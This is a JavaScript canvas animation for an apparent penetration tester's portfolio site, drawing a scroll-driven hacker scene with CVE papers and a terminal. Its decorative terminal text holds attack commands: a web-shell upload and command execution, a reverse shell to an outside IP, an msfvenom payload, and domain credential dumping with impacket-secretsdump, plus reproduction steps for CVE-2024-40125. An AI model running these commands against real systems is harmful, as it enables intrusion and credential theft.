/* ═══════════════════════════════════════════════════════════════
   0xBREN — CINEMATIC HACKER SCENE
   Scroll-driven canvas panorama · 4 camera shots
   ═══════════════════════════════════════════════════════════════

   SHOT 1 (scroll 0–25%)   : Wide — hacker at triple-monitor desk
   SHOT 2 (scroll 25–55%)  : Face close-up — screen glow, glasses
   SHOT 3 (scroll 55–80%)  : Desk overhead — CVE papers scattered
   SHOT 4 (scroll 80–100%) : Terminal extreme close-up

   Camera pans horizontally across a 5 000 px wide scene world.
   ═══════════════════════════════════════════════════════════════ */

(function () {
  'use strict';

  /* ── canvas setup ─────────────────────────── */
  const canvas = document.getElementById('hacker-scene');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');

  let W = 0, H = 0;
  let t = 0;                   // frame counter
  let camX = 0, targetCamX = 0;
  let scrollProg = 0;          // 0 → 1 through the scene-area

  /* ── terminal text pool ───────────────────── */
  const TERM_LINES = [
    '~$ nmap -sC -sV -p- 192.168.1.105',
    'Starting Nmap 7.95 ( https://nmap.org )',
    '80/tcp   open  http    Apache httpd 2.4.51',
    '443/tcp  open  https   Apache httpd 2.4.51',
    '~$ gobuster dir -u http://target -w common.txt',
    '/admin          (Status: 200) [Size: 4521]',
    '/upload         (Status: 200) [Size: 892]',
    '/media          (Status: 200) [Size: 1337]',
    '~$ curl -s http://target/upload -X POST \\',
    '  -F "file=@shell.php" -b "PHPSESSID=abc"',
    '{"status":"success","filename":"shell.php"}',
    '~$ curl "http://target/media/shell.php?cmd=id"',
    'uid=0(root) gid=0(root) groups=0(root)',
    '[!] RCE CONFIRMED — CVE-2024-40125',
    '[!] CVSS 9.8 CRITICAL — AV:N/AC:L/PR:N/UI:N',
    '~$ python3 revshell.py 10.10.14.23 4444',
    '[*] Waiting for connection...',
    '[+] Connection received from 192.168.1.105',
    'root@CLESS-SERVER-PROD:~# whoami',
    'root',
    'root@CLESS-SERVER-PROD:~# hostname',
    'CLESS-SERVER-PROD',
    'root@CLESS-SERVER-PROD:~# cat /etc/passwd | head',
    'root:x:0:0:root:/root:/bin/bash',
    '~$ msfvenom -p windows/x64/shell_reverse_tcp \\',
    '  LHOST=10.10.14.23 LPORT=4444 -f exe',
    'Payload size: 460 bytes — payload.exe',
    '~$ python3 -m http.server 8080 &',
    '[*] Serving HTTP on 0.0.0.0 port 8080',
    '~$ bloodhound-python -u admin -p *** -d corp.local',
    '[*] Enumerating domain users...',
    '[+] Found 142 users, 23 groups',
    '[+] High-value targets identified',
    '~$ impacket-secretsdump corp.local/admin@DC01',
    'Administrator:500:aad3b435b51404ee:::',
    '[+] Domain compromise successful',
    '~$ whoami /all',
    'CORP\\Administrator',
  ];
  let termIdx = 0;
  let termBuf = TERM_LINES.slice(0, 10);

  /* ── camera stops ─────────────────────────── */
  const STOPS = [
    { prog: 0.00, x: 0,    label: '// The Operator',    sub: 'Senior Penetration Tester · Singapore' },
    { prog: 0.25, x: 1450, label: '// 01. About',        sub: 'Breaking systems for a living — and loving it' },
    { prog: 0.55, x: 2800, label: '// 02. CVE Research', sub: 'CVE-2024-40125 · CRITICAL 9.8 · Full Admin RCE' },
    { prog: 0.80, x: 4050, label: '// 03. The Terminal', sub: 'Breaking Systems So They Don\'t Break You' },
  ];
  let captionLabel = STOPS[0].label;
  let captionSub   = STOPS[0].sub;
  let captionAlpha = 1;
  let captionStop  = 0;

  /* ── resize ───────────────────────────────── */
  function resize () {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }

  /* ── easing ───────────────────────────────── */
  function easeInOut (t) {
    return t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2,3)/2;
  }

  /* ── scroll driver ────────────────────────── */
  function setupScroll () {
    const area = document.getElementById('scene-area');
    if (!area) return;

    function onScroll () {
      const areaTop  = area.getBoundingClientRect().top + window.scrollY;
      const areaH    = area.offsetHeight - window.innerHeight;
      const scrolled = Math.max(0, window.scrollY - areaTop);
      scrollProg = Math.min(1, scrolled / areaH);

      // interpolate camera X between stops
      let tX = STOPS[STOPS.length - 1].x;
      for (let i = 0; i < STOPS.length - 1; i++) {
        const a = STOPS[i], b = STOPS[i+1];
        if (scrollProg >= a.prog && scrollProg <= b.prog) {
          const local = (scrollProg - a.prog) / (b.prog - a.prog);
          tX = a.x + (b.x - a.x) * easeInOut(local);

          // caption fade
          if (local < 0.15) {
            if (captionStop !== i) { captionStop = i; captionAlpha = 0; }
            captionLabel = a.label; captionSub = a.sub;
            captionAlpha = Math.min(1, captionAlpha + 0.04);
          } else if (local > 0.85) {
            if (captionStop !== i+1) { captionStop = i+1; captionAlpha = 0; }
            captionLabel = b.label; captionSub = b.sub;
            captionAlpha = Math.min(1, captionAlpha + 0.04);
          } else {
            captionAlpha = Math.max(0, captionAlpha - 0.06);
          }
          break;
        }
      }
      targetCamX = tX;
    }

    window.addEventListener('scroll', onScroll, { passive: true });
    onScroll();
  }

  /* ═══════════════════════════════════════════
     MAIN LOOP
  ═══════════════════════════════════════════ */
  function loop () {
    t++;
    // smooth camera
    camX += (targetCamX - camX) * 0.055;

    // advance terminal buffer
    if (t % 48 === 0) {
      termBuf.push(TERM_LINES[termIdx % TERM_LINES.length]);
      termIdx++;
      if (termBuf.length > 22) termBuf.shift();
    }

    draw();
    requestAnimationFrame(loop);
  }

  /* ═══════════════════════════════════════════
     MASTER DRAW
  ═══════════════════════════════════════════ */
  function draw () {
    ctx.clearRect(0, 0, W, H);
    ctx.fillStyle = '#050508';
    ctx.fillRect(0, 0, W, H);

    ctx.save();
    ctx.translate(-camX, 0);

    drawScene1(0,    0);   // 0  – 1500
    drawScene2(1430, 0);   // 1430 – 2850
    drawScene3(2780, 0);   // 2780 – 4100
    drawScene4(4020, 0);   // 4020 – 5200

    ctx.restore();

    drawHUD();
  }

  /* ═══════════════════════════════════════════
     SCENE 1 — WIDE SHOT: HACKER AT DESK
  ═══════════════════════════════════════════ */
  function drawScene1 (ox, oy) {
    const SW = 1550;

    // room gradient
    const bg = ctx.createLinearGradient(ox, oy, ox, oy + H);
    bg.addColorStop(0, '#020305');
    bg.addColorStop(0.6, '#060910');
    bg.addColorStop(1, '#08090e');
    ctx.fillStyle = bg; ctx.fillRect(ox, oy, SW, H);

    // wall grid
    drawGrid(ox, oy, SW, H * 0.7, 'rgba(0,255,136,0.018)');

    // ── ambient glow from monitors ──────────
    radialGlow(ox + 560, oy + H * 0.36, 260, 'rgba(0,255,136,0.07)');
    radialGlow(ox + 770, oy + H * 0.30, 320, 'rgba(0,212,255,0.05)');
    radialGlow(ox + 980, oy + H * 0.36, 240, 'rgba(0,255,136,0.07)');

    // ── desk ────────────────────────────────
    const deskY = oy + H * 0.63;
    const deskH = H * 0.07;

    // back edge light strip (RGB effect)
    const rgbX = ox + 180;
    const rgbW = SW - 280;
    const rgbGrad = ctx.createLinearGradient(rgbX, 0, rgbX + rgbW, 0);
    rgbGrad.addColorStop(0,    `rgba(0,255,136,${0.3 + 0.15 * Math.sin(t * 0.03)})`);
    rgbGrad.addColorStop(0.33, `rgba(0,212,255,${0.3 + 0.15 * Math.sin(t * 0.03 + 2)})`);
    rgbGrad.addColorStop(0.66, `rgba(255,71,87,${0.3 + 0.15 * Math.sin(t * 0.03 + 4)})`);
    rgbGrad.addColorStop(1,    `rgba(0,255,136,${0.3 + 0.15 * Math.sin(t * 0.03 + 6)})`);
    ctx.fillStyle = rgbGrad;
    ctx.fillRect(rgbX, deskY - 2, rgbW, 2);

    ctx.fillStyle = '#0c1018';
    ctx.fillRect(ox + 180, deskY, SW - 280, deskH);
    // top highlight
    ctx.fillStyle = 'rgba(255,255,255,0.04)';
    ctx.fillRect(ox + 180, deskY, SW - 280, 1);

    // ── monitors ────────────────────────────
    // left
    ctx.save();
    ctx.translate(ox + 460, deskY - 14);
    drawMonitor(0, 0, 230, 150, '#00ff88', 'left');
    ctx.restore();
    drawMonitorStand(ox + 520, deskY, 22, 58);

    // center (main, larger)
    ctx.save();
    ctx.translate(ox + 640, deskY - 28);
    drawMonitor(0, 0, 270, 178, '#00d4ff', 'center');
    ctx.restore();
    drawMonitorStand(ox + 770, deskY, 26, 72);

    // right
    ctx.save();
    ctx.translate(ox + 905, deskY - 14);
    drawMonitor(0, 0, 230, 150, '#00ff88', 'right');
    ctx.restore();
    drawMonitorStand(ox + 1020, deskY, 22, 58);

    // ── keyboard ────────────────────────────
    drawKeyboard(ox + 615, deskY + 8, 270, 72);

    // ── mouse ───────────────────────────────
    drawMouse(ox + 910, deskY + 16, 24, 44);

    // ── mug ─────────────────────────────────
    drawMug(ox + 415, deskY + 5, 26, 36);

    // ── notepad ─────────────────────────────
    ctx.fillStyle = '#0e1a10';
    ctx.strokeStyle = 'rgba(0,255,136,0.18)';
    ctx.lineWidth = 1;
    rr(ox + 345, deskY + 8, 62, 58, 2); ctx.fill(); ctx.stroke();
    for (let i = 0; i < 4; i++) {
      ctx.strokeStyle = 'rgba(0,255,136,0.08)';
      ctx.beginPath();
      ctx.moveTo(ox + 353, deskY + 20 + i * 11);
      ctx.lineTo(ox + 399, deskY + 20 + i * 11);
      ctx.stroke();
    }

    // ── chair ───────────────────────────────
    drawChair(ox + 770, deskY, oy + H);

    // ── character ───────────────────────────
    drawHacker(ox + 770, deskY, oy);

    // ── floor ───────────────────────────────
    const floorY = deskY + deskH + H * 0.015;
    const floor = ctx.createLinearGradient(ox, floorY, ox, oy + H);
    floor.addColorStop(0, '#06080d');
    floor.addColorStop(1, '#040507');
    ctx.fillStyle = floor;
    ctx.fillRect(ox, floorY, SW, H - floorY);

    // floor reflection
    const ref = ctx.createRadialGradient(ox + 770, floorY, 0, ox + 770, floorY, 180);
    ref.addColorStop(0, 'rgba(0,255,136,0.05)');
    ref.addColorStop(1, 'transparent');
    ctx.fillStyle = ref;
    ctx.fillRect(ox + 580, floorY, 380, 80);

    // scene label
    sceneLabel(ox + 28, oy + 28, '// SCENE 01 — THE OPERATOR');
  }

  /* ═══════════════════════════════════════════
     SCENE 2 — FACE CLOSE-UP
  ═══════════════════════════════════════════ */
  function drawScene2 (ox, oy) {
    const SW = 1450;
    ctx.fillStyle = '#020304';
    ctx.fillRect(ox, oy, SW, H);

    const cx = ox + SW * 0.44;
    const cy = oy + H * 0.43;

    // off-screen monitor glow (from the left)
    const mg = ctx.createLinearGradient(ox, oy, ox + SW * 0.5, oy);
    mg.addColorStop(0, 'rgba(0,212,255,0.10)');
    mg.addColorStop(0.5, 'rgba(0,255,136,0.04)');
    mg.addColorStop(1, 'transparent');
    ctx.fillStyle = mg;
    ctx.fillRect(ox, oy, SW, H);

    // floating data chars
    for (let i = 0; i < 35; i++) {
      const px = ox + 80 + ((i * 139 + t * 0.25) % (SW - 160));
      const py = oy + 40  + ((i * 97  + t * 0.12) % (H - 80));
      const a  = 0.06 + 0.07 * Math.sin(t * 0.025 + i);
      ctx.fillStyle = `rgba(0,255,136,${a})`;
      ctx.font = '9px "Share Tech Mono"';
      ctx.fillText('01ABCDEF#$%'[i % 11], px, py);
    }

    // head glow
    radialGlow(cx, cy, 230, 'rgba(0,212,255,0.09)');

    // ── face art ────────────────────────────
    drawFace(cx, cy);

    // ── side floating cert/spec tags ────────
    const lefts = ['OSCP','OSEP','OSWE','CRT','CEH Master'];
    const rights = ['Web VAPT','Infra VAPT','AD Testing','Kiosk PT','Thick Client'];
    ctx.font = '11px "Share Tech Mono"';
    lefts.forEach((l, i) => {
      const a = 0.35 + 0.25 * Math.sin(t * 0.025 + i * 0.9);
      ctx.fillStyle = `rgba(0,255,136,${a})`;
      ctx.fillText(l, ox + 46, oy + H * 0.2 + i * H * 0.07);
    });
    rights.forEach((l, i) => {
      const a = 0.35 + 0.25 * Math.sin(t * 0.025 + i * 0.7 + 1.5);
      ctx.fillStyle = `rgba(0,212,255,${a})`;
      ctx.textAlign = 'right';
      ctx.fillText(l, ox + SW - 46, oy + H * 0.22 + i * H * 0.07);
      ctx.textAlign = 'left';
    });

    // ── name plate ──────────────────────────
    const npX = cx - 125, npY = cy + 178;
    ctx.fillStyle = 'rgba(0,255,136,0.07)';
    ctx.strokeStyle = 'rgba(0,255,136,0.28)';
    ctx.lineWidth = 1;
    rr(npX, npY, 250, 52, 2); ctx.fill(); ctx.stroke();
    ctx.font = 'bold 14px "Orbitron"';
    ctx.fillStyle = '#00ff88';
    ctx.textAlign = 'center';
    ctx.fillText('BRENDON TEO', cx, npY + 22);
    ctx.font = '10px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,212,255,0.75)';
    ctx.fillText('Senior Penetration Tester · Singapore', cx, npY + 40);
    ctx.textAlign = 'left';

    sceneLabel(ox + 28, oy + 28, '// SCENE 02 — THE RESEARCHER');
  }

  /* ═══════════════════════════════════════════
     SCENE 3 — DESK TOPDOWN (CVE PAPERS)
  ═══════════════════════════════════════════ */
  function drawScene3 (ox, oy) {
    const SW = 1350;

    // desk surface
    const dsk = ctx.createLinearGradient(ox, oy, ox + SW, oy + H);
    dsk.addColorStop(0, '#080f08');
    dsk.addColorStop(1, '#0c1017');
    ctx.fillStyle = dsk;
    ctx.fillRect(ox, oy, SW, H);
    drawGrid(ox, oy, SW, H, 'rgba(0,255,136,0.012)');

    // lamp glow top-right
    radialGlow(ox + SW - 120, oy + 80, 200, 'rgba(255,220,120,0.05)');

    // ── laptop (center-right) ───────────────
    drawLaptopTopdown(ox + SW * 0.48, oy + H * 0.22, 310, 200);

    // ── main CVE report paper ───────────────
    drawPaper(ox + 90, oy + 55, 280, 370, -7, [
      { t: 'PENETRATION TEST REPORT', c: '#00ff88', b: true },
      { t: '────────────────────────', c: '#1a2a1a' },
      { t: 'CVE-2024-40125',          c: '#ff4757', b: true },
      { t: 'CVSS: 9.8 CRITICAL',      c: '#ff4757' },
      { t: 'Vendor: Closed-Loop Tech', c: '#555' },
      { t: 'Product: CLESS Server',   c: '#555' },
      { t: 'Version: 4.5.2',          c: '#555' },
      { t: '────────────────────────', c: '#1a2a1a' },
      { t: 'CWE-434: File Upload',    c: '#ffa502' },
      { t: 'AV:N/AC:L/PR:N/UI:N',    c: '#00d4ff' },
      { t: 'C:H / I:H / A:H',        c: '#00d4ff' },
      { t: '────────────────────────', c: '#1a2a1a' },
      { t: '✓ PUBLISHED — NVD NIST',  c: '#00ff88' },
      { t: 'Published: Sep 19, 2024', c: '#555' },
      { t: 'Last Modified: Sep 25',   c: '#555' },
    ]);

    // ── advisory paper ──────────────────────
    drawPaper(ox + 295, oy + 30, 255, 310, 6, [
      { t: 'VULNERABILITY ADVISORY', c: '#00d4ff', b: true },
      { t: '────────────────────────', c: '#1a2a1a' },
      { t: 'Target: CLESS Server',   c: '#555' },
      { t: 'Port: 80/443',           c: '#555' },
      { t: 'Auth required: NO',      c: '#ff4757' },
      { t: '────────────────────────', c: '#1a2a1a' },
      { t: 'Steps to Reproduce:',    c: '#ffa502' },
      { t: '1. Access /upload',      c: '#333' },
      { t: '2. Upload shell.php',    c: '#333' },
      { t: '3. Execute via /media/', c: '#333' },
      { t: '4. RCE achieved ✓',      c: '#00ff88' },
      { t: '────────────────────────', c: '#1a2a1a' },
      { t: 'Patch: Update to 4.5.3', c: '#00ff88' },
    ]);

    // ── notes paper ─────────────────────────
    drawPaper(ox + 140, oy + H * 0.52, 215, 260, -4, [
      { t: '## RECON NOTES ##',      c: '#00ff88', b: true },
      { t: '',                        c: '' },
      { t: 'nmap results:',          c: '#ffa502' },
      { t: '> 80/tcp  open http',    c: '#333' },
      { t: '> 443/tcp open https',   c: '#333' },
      { t: '> /upload (200 OK)',      c: '#ff4757' },
      { t: '',                        c: '' },
      { t: 'File filter: NONE',      c: '#ff4757', b: true },
      { t: 'Auth check: BYPASS',     c: '#ff4757', b: true },
      { t: 'Impact: RCE/ROOT',       c: '#ff4757', b: true },
    ]);

    // ── sticky notes ────────────────────────
    drawSticky(ox + SW * 0.68, oy + H * 0.52, 128, 105, '#ffdd59', [
      'TODO:', '- Write PoC', '- Notify vendor',
      '- NIST submit', '✓ Published!',
    ]);
    drawSticky(ox + SW - 195, oy + H * 0.60, 135, 95, '#ff6b81', [
      'CVE Filed: 1', 'Next target:', 'Cloud SSRF', '→ AWS IAM',
    ]);
    drawSticky(ox + SW - 200, oy + H * 0.26, 130, 90, '#a8edea', [
      'Scope:', '- Web VAPT', '- Infra VAPT', '- Source Code',
    ]);

    // ── pen ─────────────────────────────────
    drawPen(ox + 420, oy + H * 0.49, -12);

    // ── coffee ring ─────────────────────────
    drawCoffeeRing(ox + SW * 0.78, oy + H * 0.16, 34);

    // ── paper clip ──────────────────────────
    drawPaperClip(ox + 240, oy + 50);

    sceneLabel(ox + 28, oy + 28, '// SCENE 03 — THE EVIDENCE');
  }

  /* ═══════════════════════════════════════════
     SCENE 4 — TERMINAL EXTREME CLOSE-UP
  ═══════════════════════════════════════════ */
  function drawScene4 (ox, oy) {
    const SW = 1200;
    ctx.fillStyle = '#020304';
    ctx.fillRect(ox, oy, SW, H);

    // screen glow flood
    const sg = ctx.createRadialGradient(ox + SW * 0.5, oy + H * 0.44, 0, ox + SW * 0.5, oy + H * 0.44, H * 0.7);
    sg.addColorStop(0, 'rgba(0,255,136,0.14)');
    sg.addColorStop(0.5, 'rgba(0,255,136,0.04)');
    sg.addColorStop(1, 'transparent');
    ctx.fillStyle = sg;
    ctx.fillRect(ox, oy, SW, H);

    // ── monitor bezel ────────────────────────
    const mx = ox + 60, my = oy + H * 0.07;
    const mw = SW - 120, mh = H * 0.8;

    // outer bezel
    ctx.fillStyle = '#08090c';
    ctx.shadowBlur = 30;
    ctx.shadowColor = '#00ff88';
    ctx.strokeStyle = 'rgba(0,255,136,0.22)';
    ctx.lineWidth = 2;
    rr(mx - 22, my - 22, mw + 44, mh + 44, 10); ctx.fill(); ctx.stroke();
    ctx.shadowBlur = 0;

    // screen
    ctx.fillStyle = '#020702';
    ctx.strokeStyle = 'rgba(0,255,136,0.35)';
    ctx.lineWidth = 1.5;
    ctx.shadowBlur = 15;
    ctx.shadowColor = '#00ff88';
    rr(mx, my, mw, mh, 5); ctx.fill(); ctx.stroke();
    ctx.shadowBlur = 0;

    // scanlines
    ctx.save();
    rr(mx, my, mw, mh, 5); ctx.clip();
    for (let sy = my; sy < my + mh; sy += 3) {
      ctx.fillStyle = 'rgba(0,0,0,0.14)';
      ctx.fillRect(mx, sy, mw, 1);
    }
    ctx.restore();

    // ── title bar ───────────────────────────
    ctx.fillStyle = '#0c111a';
    ctx.fillRect(mx, my, mw, 32);
    circle(mx + 14, my + 16, 5, '#ff4757');
    circle(mx + 28, my + 16, 5, '#ffdd59');
    circle(mx + 42, my + 16, 5, '#00ff88');
    ctx.font = '11px "Share Tech Mono"';
    ctx.fillStyle = '#4a5568';
    ctx.textAlign = 'center';
    ctx.fillText('bash — root@CLESS-SERVER-PROD — 140×40', mx + mw / 2, my + 20);
    ctx.textAlign = 'left';

    // ── terminal text ────────────────────────
    ctx.save();
    rr(mx, my + 32, mw, mh - 32, 4); ctx.clip();
    const tx = mx + 22;
    let ty = my + 56;
    const lh = Math.floor((mh - 48) / termBuf.length);
    const fontSize = Math.min(14, lh - 4);
    ctx.font = `${fontSize}px "Share Tech Mono"`;

    termBuf.forEach((line, i) => {
      const isLast = i === termBuf.length - 1;

      if (line.startsWith('~$') || line.endsWith('#')) {
        ctx.fillStyle = '#00ff88';
        ctx.shadowBlur = 4; ctx.shadowColor = '#00ff88';
        ctx.fillText('$ ', tx, ty);
        ctx.fillStyle = '#00d4ff';
        ctx.shadowBlur = 0;
        ctx.fillText(line.replace('~$ ', '').replace(/root@.*?#\s?/, ''), tx + 16, ty);
      } else if (line.includes('[!]') || line.toUpperCase().includes('CRITICAL') || line.includes('RCE') || line.includes('root') || line.includes('Root')) {
        ctx.fillStyle = '#ff4757';
        ctx.shadowBlur = 3; ctx.shadowColor = '#ff4757';
        ctx.fillText(line, tx, ty);
        ctx.shadowBlur = 0;
      } else if (line.startsWith('[+]') || line.includes('success') || line.startsWith('[*]')) {
        ctx.fillStyle = '#00ff88';
        ctx.fillText(line, tx, ty);
      } else if (line.includes('Payload') || line.includes('bytes') || line.startsWith('[-')) {
        ctx.fillStyle = '#ffa502';
        ctx.fillText(line, tx, ty);
      } else {
        ctx.fillStyle = '#5a6a5a';
        ctx.fillText(line, tx, ty);
      }

      ty += lh;
    });

    // blinking cursor
    if (t % 60 < 30) {
      ctx.fillStyle = '#00ff88';
      ctx.shadowBlur = 8; ctx.shadowColor = '#00ff88';
      ctx.fillRect(tx, ty - lh + 2, 9, fontSize + 2);
      ctx.shadowBlur = 0;
    }
    ctx.restore();

    // corner brackets
    bracket(mx + 4, my + 4, 18, 'rgba(0,255,136,0.5)', false, false);
    bracket(mx + mw - 4, my + 4, 18, 'rgba(0,255,136,0.5)', true, false);
    bracket(mx + 4, my + mh - 4, 18, 'rgba(0,255,136,0.5)', false, true);
    bracket(mx + mw - 4, my + mh - 4, 18, 'rgba(0,255,136,0.5)', true, true);

    // ── status bar ───────────────────────────
    ctx.fillStyle = '#0c111a';
    ctx.fillRect(mx, my + mh - 22, mw, 22);
    ctx.font = '10px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,255,136,0.6)';
    ctx.fillText('CVE-2024-40125  |  CRITICAL 9.8  |  uid=0(root)  |  CLESS-SERVER-PROD', mx + 10, my + mh - 8);
    // live indicator
    const li = 0.6 + 0.4 * Math.sin(t * 0.1);
    ctx.fillStyle = `rgba(0,255,136,${li})`;
    ctx.font = 'bold 10px "Share Tech Mono"';
    ctx.textAlign = 'right';
    ctx.fillText('● LIVE', mx + mw - 10, my + mh - 8);
    ctx.textAlign = 'left';

    sceneLabel(ox + 28, oy + 28, '// SCENE 04 — THE TERMINAL');
  }

  /* ═══════════════════════════════════════════
     CHARACTER: HACKER AT DESK
  ═══════════════════════════════════════════ */
  function drawHacker (cx, deskY, oy) {
    const bodyTop = deskY - 30;
    const bob  = 2.5 * Math.sin(t * 0.06);         // breathing
    const lt   = 5   * Math.sin(t * 0.22);          // left typing
    const rt   = 5   * Math.sin(t * 0.22 + Math.PI); // right typing (offset)

    /* hoodie body */
    ctx.fillStyle = '#0c1520';
    ctx.strokeStyle = 'rgba(0,255,136,0.12)';
    ctx.lineWidth = 1;
    ctx.beginPath();
    ctx.moveTo(cx - 52, bodyTop);
    ctx.lineTo(cx + 52, bodyTop);
    ctx.lineTo(cx + 46, bodyTop - 118 + bob);
    ctx.lineTo(cx - 46, bodyTop - 118 + bob);
    ctx.closePath();
    ctx.fill(); ctx.stroke();

    /* left arm */
    ctx.fillStyle = '#0c1520';
    ctx.strokeStyle = 'rgba(0,255,136,0.09)';
    ctx.beginPath();
    ctx.moveTo(cx - 46, bodyTop - 105 + bob);
    ctx.lineTo(cx - 78, bodyTop - 55 + bob);
    ctx.lineTo(cx - 110, deskY - 20 + lt);
    ctx.lineTo(cx - 92,  deskY - 14 + lt);
    ctx.lineTo(cx - 62, bodyTop - 50 + bob);
    ctx.lineTo(cx - 30, bodyTop - 100 + bob);
    ctx.closePath();
    ctx.fill(); ctx.stroke();

    /* right arm */
    ctx.beginPath();
    ctx.moveTo(cx + 46, bodyTop - 105 + bob);
    ctx.lineTo(cx + 78, bodyTop - 55 + bob);
    ctx.lineTo(cx + 110, deskY - 20 + rt);
    ctx.lineTo(cx + 92,  deskY - 14 + rt);
    ctx.lineTo(cx + 62, bodyTop - 50 + bob);
    ctx.lineTo(cx + 30, bodyTop - 100 + bob);
    ctx.closePath();
    ctx.fill(); ctx.stroke();

    /* hands */
    ctx.fillStyle = '#162030';
    ctx.beginPath();
    ctx.ellipse(cx - 95, deskY - 13 + lt, 19, 10, -0.18, 0, Math.PI * 2);
    ctx.fill();
    ctx.beginPath();
    ctx.ellipse(cx + 95, deskY - 13 + rt, 19, 10, 0.18, 0, Math.PI * 2);
    ctx.fill();

    // fingers
    for (let f = 0; f < 4; f++) {
      const fy = (f % 2) * 3;
      ctx.fillStyle = '#1c2e3e';
      ctx.beginPath();
      ctx.ellipse(cx - 108 + f * 11, deskY - 18 + lt + fy, 4, 7, 0, 0, Math.PI * 2);
      ctx.fill();
      ctx.beginPath();
      ctx.ellipse(cx + 75 + f * 11, deskY - 18 + rt + fy, 4, 7, 0, 0, Math.PI * 2);
      ctx.fill();
    }

    /* neck */
    ctx.fillStyle = '#162030';
    ctx.fillRect(cx - 13, bodyTop - 136 + bob, 26, 22);

    /* hood */
    ctx.fillStyle = '#08111c';
    ctx.strokeStyle = 'rgba(0,255,136,0.11)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.arc(cx, bodyTop - 168 + bob, 56, 0, Math.PI * 2);
    ctx.fill(); ctx.stroke();

    /* screen glow on face */
    const fg = ctx.createRadialGradient(cx - 20, bodyTop - 160 + bob, 0, cx, bodyTop - 160 + bob, 50);
    fg.addColorStop(0, 'rgba(0,212,255,0.18)');
    fg.addColorStop(1, 'rgba(0,212,255,0)');
    ctx.fillStyle = fg;
    ctx.beginPath();
    ctx.ellipse(cx, bodyTop - 158 + bob, 36, 42, 0, 0, Math.PI * 2);
    ctx.fill();

    /* glasses */
    ctx.strokeStyle = 'rgba(60,80,120,0.85)';
    ctx.lineWidth = 1.5;
    rr(cx - 32, bodyTop - 178 + bob, 24, 14, 3); ctx.stroke();
    rr(cx + 8,  bodyTop - 178 + bob, 24, 14, 3); ctx.stroke();
    ctx.beginPath();
    ctx.moveTo(cx - 8, bodyTop - 172 + bob);
    ctx.lineTo(cx + 8, bodyTop - 172 + bob);
    ctx.stroke();

    // glass reflections (mini terminal text)
    ctx.save();
    rr(cx - 31, bodyTop - 177 + bob, 22, 12, 2); ctx.clip();
    ctx.fillStyle = 'rgba(0,20,12,0.7)';
    ctx.fillRect(cx - 32, bodyTop - 178 + bob, 26, 15);
    ctx.font = '4px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,255,136,0.9)';
    ['~$ root', 'uid=0', 'CRIT'].forEach((l, i) =>
      ctx.fillText(l, cx - 29, bodyTop - 172 + bob + i * 5));
    ctx.restore();

    ctx.save();
    rr(cx + 9, bodyTop - 177 + bob, 22, 12, 2); ctx.clip();
    ctx.fillStyle = 'rgba(0,12,20,0.7)';
    ctx.fillRect(cx + 8, bodyTop - 178 + bob, 26, 15);
    ctx.font = '4px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,212,255,0.9)';
    ['nmap', '/upload', '200OK'].forEach((l, i) =>
      ctx.fillText(l, cx + 11, bodyTop - 172 + bob + i * 5));
    ctx.restore();

    /* headphones */
    ctx.strokeStyle = 'rgba(22,22,40,0.95)';
    ctx.lineWidth = 7;
    ctx.beginPath();
    ctx.arc(cx, bodyTop - 185 + bob, 42, Math.PI * 1.08, Math.PI * 1.92);
    ctx.stroke();
    ctx.lineWidth = 2;
    ctx.strokeStyle = 'rgba(0,212,255,0.2)';
    ctx.fillStyle = '#14142a';
    for (const ex of [cx - 40, cx + 40]) {
      ctx.beginPath();
      ctx.ellipse(ex, bodyTop - 172 + bob, 10, 13, ex < cx ? 0.3 : -0.3, 0, Math.PI * 2);
      ctx.fill(); ctx.stroke();
    }

    /* hoodie text */
    ctx.font = 'bold 7px "Share Tech Mono"';
    ctx.fillStyle = 'rgba(0,255,136,0.18)';
    ctx.textAlign = 'center';
    ctx.fillText('0xBREN', cx, bodyTop - 78 + bob);
    ctx.textAlign = 'left';
  }

  /* ═══════════════════════════════════════════
     CHARACTER: FACE CLOSE-UP
  ═══════════════════════════════════════════ */
  function drawFace (cx, cy) {
    /* hood background */
    ctx.fillStyle = '#05080e';
    ctx.strokeStyle = 'rgba(0,255,136,0.07)';
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.arc(cx, cy, 166, 0, Math.PI * 2);
    ctx.fill(); ctx.stroke();

    /* screen-glow wash across face */
    const gl = ctx.createLinearGradient(cx - 150, cy, cx + 80, cy);
    gl.addColorStop(0, 'rgba(0,212,255,0.22)');
    gl.addColorStop(1, 'rgba(0,212,255,0.01)');
    ctx.fillStyle = gl;
    ctx.beginPath();
    ctx.ellipse(cx - 18, cy, 114, 140, -0.08, 0, Math.PI * 2);
    ctx.fill();

    /* face skin */
    ctx.fillStyle = '#111c28';
    ctx.beginPath();
    ctx.ellipse(cx, cy, 105, 132, 0, 0, Math.PI * 2);
    ctx.fill();

    /* glasses frames */
    ctx.strokeStyle = 'rgba(70,80,140,0.9)';
    ctx.lineWidth = 3;
    rr(cx - 100, cy - 28, 82, 50, 8); ctx.stroke();
    rr(cx + 18,  cy - 28, 82, 50, 8); ctx.stroke();
    ctx.beginPath();
    ctx.moveTo(cx - 18, cy - 8);
    ctx.lineTo(cx + 18, cy - 8);
    ctx.stroke();
    ctx.strokeStyle = 'rgba(70,80,140,0.5)';
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(cx - 180, cy - 10);
    ctx.lineTo(cx - 100, cy - 10);
    ctx.stroke();
    ctx.beginPath();
    ctx.moveTo(cx + 100, cy - 10);
    ctx.lineTo(cx + 180, cy - 10);
    ctx.stroke();

    /* left lens with terminal reflection */
    ctx.save();
    rr(cx - 99, cy - 27, 80, 48, 7); ctx.clip();
    ctx.fillStyle = 'rgba(0,30,18,0.75)';
    ctx.fillRect(cx - 100, cy - 28, 84, 52);
    ctx.font = '5.5px "Share Tech Mono"';
    const ll = termBuf.slice(-6);
    ll.forEach((ln, i) => {
      ctx.fillStyle = ln.startsWith('~$') ? 'rgba(0,255,136,0.95)' : 'rgba(0,255,136,0.5)';
      ctx.fillText(ln.slice(0, 18), cx - 97, cy - 17 + i * 8);
    });
    ctx.restore();

    /* right lens */
    ctx.save();
    rr(cx + 19, cy - 27, 80, 48, 7); ctx.clip();
